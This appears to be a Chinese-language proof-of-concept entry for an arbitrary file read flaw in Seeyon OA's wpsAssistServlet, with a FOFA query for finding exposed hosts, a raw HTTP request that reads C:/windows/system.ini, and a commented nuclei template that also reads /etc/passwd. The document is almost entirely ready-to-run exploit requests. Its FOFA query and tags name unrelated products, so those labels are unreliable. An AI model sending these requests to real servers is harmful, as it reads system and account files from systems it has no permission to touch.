## 致远OA wpsAssistServlet 任意文件读取

#### fofa

> app="Kingdee-EAS"

#### poc

```http
POST /seeyon/wpsAssistServlet HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

flag=template&templateUrl=C:/windows/system.ini
```

#### nuclei

```yaml
id: Seeyon-wpsAssistServlet-arbitrary-file-read
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: Seeyon wpsAssistServlet 任意文件读取
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Esafenet
  # 标签，可以通过标签进行扫描

http:
  - raw:
    - |
        POST /seeyon/wpsAssistServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        flag=template&templateUrl=C:/windows/system.ini
      
    - |
        POST /seeyon/wpsAssistServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        flag=template&templateUrl=/etc/passwd
    # {{Hostname}} 替换主机名
    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
          - "for 16-bit app support"
        condition: or

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---